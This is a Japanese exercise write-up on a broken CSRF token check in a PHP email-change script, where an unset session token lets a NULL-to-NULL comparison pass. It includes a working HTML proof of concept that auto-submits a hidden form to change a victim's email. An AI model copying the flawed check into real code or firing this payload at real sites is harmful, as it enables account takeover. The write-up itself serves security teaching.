# 問題：間違ったCSRF対策～初級編～
https://blog.tokumaru.org/2018/11/csrf.html

## Run
```
$: make up
$: open http://poc.local.xss.moe
```

## 解説
問題のあるコードは`chgmail.php`。

```php
<?php // chgmail.php メールアドレス変更実行
  session_start();
  if (empty($_SESSION['id'])) {
    die('ログインしてください');
  }
  $id = $_SESSION['id']; // ユーザIDの取り出し
  if ($_POST['token'] !== $_SESSION['token']) { // ワンタイムトークン確認
    die('正規の画面からご使用ください');
  }
  unset($_SESSION['token']); // 使用済みトークンの削除
  $mail = $_POST['mail'];
  $_SESSION['mail'] = $mail;
?>
<body>
<?php echo htmlspecialchars($id, ENT_COMPAT, 'UTF-8'); ?>さんのメールアドレスを<?php
 echo htmlspecialchars($mail, ENT_COMPAT, 'UTF-8'); ?>に変更しました<br>
<a href="mypage.php">マイページ</a>
</body>
```

うち、問題のある箇所は以下の部分。

```php
if ($_POST['token'] !== $_SESSION['token']) { // ワンタイムトークン確認
  die('正規の画面からご使用ください');
}
```

- `$_SESSION['token']`の存在確認を行っていないため、`chgmailform.php`にアクセスしていない状態のログイン済ユーザが`chgmail.php`にアクセスする際、`$_SESSION['token']`の値は`NULL`となる。
- コード中で`$_POST['token']`との比較によってCSRF対策をおこなっているように見えるが、上記の条件を満たす場合は`$_POST['token']`を送信せずにCSRFを行えば`NULL`同士の比較となりチェックをバイパスできる。

## PoC
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC</title>
</head>
<body>
  <iframe id="frame" src="//chall.local.xss.moe/mypage.php" style="display:none"></iframe>
  <form id="form" method="POST" action="//chall.local.xss.moe/chgmail.php">
    <input type="hidden" name="mail" value="pwned@example.jp">
  </form>
  <script>
    let frame = document.getElementById('frame');

    frame.addEventListener('load', (e) => {
      let form = document.getElementById('form');
      form.submit();
    });
  </script>
</body>
</html>
```

※便宜上iframe経由で`mypage.php`を読み込ませているが実際の攻撃では必ずしも必要ではない。
